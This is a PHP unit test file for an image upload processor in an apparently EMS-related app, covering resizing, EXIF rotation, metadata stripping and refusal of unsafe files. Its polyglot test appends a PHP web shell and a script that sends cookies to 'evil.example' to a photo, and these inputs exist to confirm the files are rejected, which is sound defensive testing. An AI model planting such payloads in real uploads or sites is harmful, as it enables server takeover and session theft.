<?php

declare(strict_types=1);

namespace Tests\Unit\Narcotics;

use App\Services\Ems\EmsException;
use App\Services\Narcotics\NarcoticsImageProcessor;
use Tests\TestCase;

final class NarcoticsImageProcessorTest extends TestCase
{
    private NarcoticsImageProcessor $processor;

    /** @var list<string> */
    private array $files = [];

    protected function setUp(): void
    {
        parent::setUp();
        $this->processor = new NarcoticsImageProcessor;
    }

    protected function tearDown(): void
    {
        foreach ($this->files as $file) {
            @unlink($file);
        }
        parent::tearDown();
    }

    // ------------------------------------------------------------- fixtures

    private function file(string $bytes): string
    {
        $path = tempnam(sys_get_temp_dir(), 'nip');
        file_put_contents($path, $bytes);
        $this->files[] = $path;

        return $path;
    }

    private function jpeg(int $width, int $height, ?int $orientation = null): string
    {
        $image = imagecreatetruecolor($width, $height);
        imagefilledrectangle($image, 0, 0, intdiv($width, 2) - 1, $height - 1, 0xE02020); // left half red
        imagefilledrectangle($image, intdiv($width, 2), 0, $width - 1, $height - 1, 0x2020E0); // right half blue
        ob_start();
        imagejpeg($image, null, 92);
        $bytes = (string) ob_get_clean();
        if ($orientation === null) {
            return $bytes;
        }
        $tiff = 'II'.pack('v', 42).pack('V', 8).pack('v', 1).pack('v', 0x0112).pack('v', 3).pack('V', 1).pack('v', $orientation).pack('v', 0).pack('V', 0);
        $payload = "Exif\0\0".$tiff.'GPSLatitude=25.79N GPSLongitude=80.13W';

        return substr($bytes, 0, 2)."\xFF\xE1".pack('n', strlen($payload) + 2).$payload.substr($bytes, 2);
    }

    /** @return array{0: int, 1: int, 2: int} red, green, blue at a point of the decoded output */
    private function pixel(string $bytes, int $x, int $y): array
    {
        $image = imagecreatefromstring($bytes);
        $this->assertNotFalse($image, 'The output must decode as a picture.');
        $rgb = imagecolorat($image, $x, $y);

        return [($rgb >> 16) & 0xFF, ($rgb >> 8) & 0xFF, $rgb & 0xFF];
    }

    private function assertReddish(array $rgb): void
    {
        $this->assertGreaterThan(180, $rgb[0], 'expected red, got '.json_encode($rgb));
        $this->assertLessThan(90, $rgb[2], 'expected red, got '.json_encode($rgb));
    }

    private function assertBluish(array $rgb): void
    {
        $this->assertGreaterThan(180, $rgb[2], 'expected blue, got '.json_encode($rgb));
        $this->assertLessThan(90, $rgb[0], 'expected blue, got '.json_encode($rgb));
    }

    private function assertRefused(string $bytes, string $code, ?callable $setup = null): void
    {
        $setup?->__invoke();
        try {
            $this->processor->process($this->file($bytes));
            $this->fail('Expected the file to be refused with '.$code);
        } catch (EmsException $exception) {
            $this->assertSame($code, $exception->errorCode, $exception->getMessage());
            $this->assertSame(422, $exception->status);
            $this->assertArrayHasKey('photo', $exception->fields);
        }
    }

    // ---------------------------------------------------------------- tests

    public function test_a_photo_becomes_three_sizes_of_one_clean_format(): void
    {
        $result = $this->processor->process($this->file($this->jpeg(1600, 1200)));

        $this->assertContains($result->mime, ['image/webp', 'image/jpeg']);
        $this->assertSame([1600, 1200], [$result->width, $result->height]);
        [$fullW] = getimagesizefromstring($result->full);
        [$previewW] = getimagesizefromstring($result->preview);
        [$thumbW] = getimagesizefromstring($result->thumb);
        $this->assertSame(1600, $fullW);
        $this->assertSame(1280, $previewW);
        $this->assertSame(360, $thumbW);
        $this->assertSame(hash('sha256', $result->full), $result->sha256());
        $this->assertSame(strlen($result->full), $result->bytes());
    }

    public function test_the_stored_format_is_the_smaller_of_webp_and_jpeg_and_every_size_shares_it(): void
    {
        $result = $this->processor->process($this->file($this->jpeg(1600, 1200)));
        $signature = static fn (string $bytes): string => str_starts_with($bytes, "\xFF\xD8") ? 'image/jpeg' : (substr($bytes, 8, 4) === 'WEBP' ? 'image/webp' : 'other');

        foreach ([$result->full, $result->preview, $result->thumb] as $bytes) {
            $this->assertSame($result->mime, $signature($bytes));
        }
        if (! NarcoticsImageProcessor::webpAvailable()) {
            $this->assertSame('image/jpeg', $result->mime);
        }
    }

    public function test_all_metadata_is_stripped(): void
    {
        $source = $this->jpeg(900, 600, 1);
        $this->assertStringContainsString('GPSLatitude', $source, 'the fixture must carry GPS text');
        $result = $this->processor->process($this->file($source));

        foreach ([$result->full, $result->preview, $result->thumb] as $bytes) {
            $this->assertStringNotContainsString('GPSLatitude', $bytes);
            $this->assertStringNotContainsString('Exif', $bytes);
            $this->assertStringNotContainsString('XMP', $bytes);
        }
    }

    public function test_a_long_edge_over_the_cap_is_scaled_down_with_the_same_shape(): void
    {
        $result = $this->processor->process($this->file($this->jpeg(4000, 3000)));

        $this->assertSame(3200, $result->width);
        $this->assertSame(2400, $result->height);
    }

    public function test_a_small_photo_is_never_enlarged(): void
    {
        $result = $this->processor->process($this->file($this->jpeg(640, 480)));

        $this->assertSame([640, 480], [$result->width, $result->height]);
        [$previewW] = getimagesizefromstring($result->preview);
        $this->assertSame(640, $previewW, 'the preview must not be bigger than the original');
    }

    public function test_exif_orientation_6_stands_a_sideways_phone_photo_upright(): void
    {
        // Stored landscape 800x600 (red left, blue right) with "rotate 90 clockwise to view": shown portrait, red on top.
        $result = $this->processor->process($this->file($this->jpeg(800, 600, 6)));

        $this->assertSame([600, 800], [$result->width, $result->height]);
        $this->assertReddish($this->pixel($result->full, 300, 150));
        $this->assertBluish($this->pixel($result->full, 300, 650));
    }

    public function test_exif_orientation_8_rotates_the_other_way_and_3_is_a_half_turn(): void
    {
        $left = $this->processor->process($this->file($this->jpeg(800, 600, 8)));
        $this->assertSame([600, 800], [$left->width, $left->height]);
        $this->assertBluish($this->pixel($left->full, 300, 150));
        $this->assertReddish($this->pixel($left->full, 300, 650));

        $half = $this->processor->process($this->file($this->jpeg(800, 600, 3)));
        $this->assertSame([800, 600], [$half->width, $half->height]);
        $this->assertBluish($this->pixel($half->full, 150, 300));
        $this->assertReddish($this->pixel($half->full, 650, 300));
    }

    public function test_a_transparent_png_is_painted_on_white(): void
    {
        $image = imagecreatetruecolor(700, 500);
        imagealphablending($image, false);
        imagesavealpha($image, true);
        imagefill($image, 0, 0, (int) imagecolorallocatealpha($image, 0, 0, 0, 127));
        ob_start();
        imagepng($image);
        $png = (string) ob_get_clean();

        $result = $this->processor->process($this->file($png));

        $rgb = $this->pixel($result->full, 100, 100);
        $this->assertGreaterThan(240, min($rgb), 'transparent pixels become white, got '.json_encode($rgb));
    }

    public function test_a_gif_a_text_file_and_a_pdf_are_refused_by_their_content_not_their_name(): void
    {
        $gif = imagecreatetruecolor(700, 500);
        ob_start();
        imagegif($gif);
        $this->assertRefused((string) ob_get_clean(), 'photo_type');
        $this->assertRefused("just some words that claim to be a photo.jpg\n", 'photo_type');
        $this->assertRefused("%PDF-1.7\n1 0 obj\n<<>>\nendobj\n", 'photo_type');
        $this->assertRefused('<svg xmlns="http://www.w3.org/2000/svg" width="700" height="500"><script>alert(1)</script></svg>', 'photo_type');
    }

    public function test_a_polyglot_with_a_script_appended_to_a_real_photo_is_refused(): void
    {
        $photo = $this->jpeg(800, 600);

        $this->assertRefused($photo."\n<?php system(\$_GET['c']); ?>", 'photo_unsafe');
        $this->assertRefused($photo.'<script>fetch("https://evil.example/?c="+document.cookie)</script>', 'photo_unsafe');
        $this->assertRefused($photo.'<!DOCTYPE HTML><html><body>hi</body></html>', 'photo_unsafe');
    }

    public function test_a_file_over_the_upload_cap_is_refused_before_it_is_decoded(): void
    {
        config()->set('narcotics_checks.image.max_upload_kb', 4);

        $this->assertRefused($this->jpeg(800, 600), 'photo_too_large');
    }

    public function test_a_photo_with_too_many_pixels_is_refused_from_its_header(): void
    {
        config()->set('narcotics_checks.image.max_source_pixels', 100_000);

        $this->assertRefused($this->jpeg(800, 600), 'photo_too_large');
    }

    public function test_a_photo_too_small_to_read_is_refused(): void
    {
        $this->assertRefused($this->jpeg(200, 150), 'photo_small');
    }

    public function test_a_truncated_or_corrupt_photo_is_refused_with_a_plain_message(): void
    {
        $photo = $this->jpeg(800, 600);

        $this->assertRefused(substr($photo, 0, 600), 'photo_invalid');
        $this->assertRefused("\xFF\xD8\xFF\xE0garbage-that-is-not-a-jpeg", 'photo_invalid');
    }

    public function test_an_empty_file_is_refused(): void
    {
        $this->assertRefused('', 'photo_invalid');
    }

    public function test_the_form_lists_only_formats_the_server_can_read(): void
    {
        $types = NarcoticsImageProcessor::acceptedMimeTypes();

        $this->assertContains('image/jpeg', $types);
        $this->assertSame(NarcoticsImageProcessor::webpAvailable(), in_array('image/webp', $types, true));
    }
}
